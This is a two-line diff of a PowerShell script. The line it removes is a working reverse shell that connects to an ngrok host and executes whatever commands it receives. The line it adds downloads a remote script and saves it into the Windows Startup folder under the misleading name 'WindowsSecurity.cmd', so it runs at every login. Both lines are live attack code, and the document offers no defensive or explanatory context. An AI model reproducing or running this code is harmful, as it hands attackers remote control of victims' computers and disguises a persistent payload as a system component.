@@ -1,3 +1,2 @@
 
-$TCPClient = New-Object Net.Sockets.TCPClient('0.tcp.in.ngrok.io', 14728);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
-
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/hmdsazzad17/test/main/fun.ps1' -OutFile $ENV:UserProfile'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.cmd'
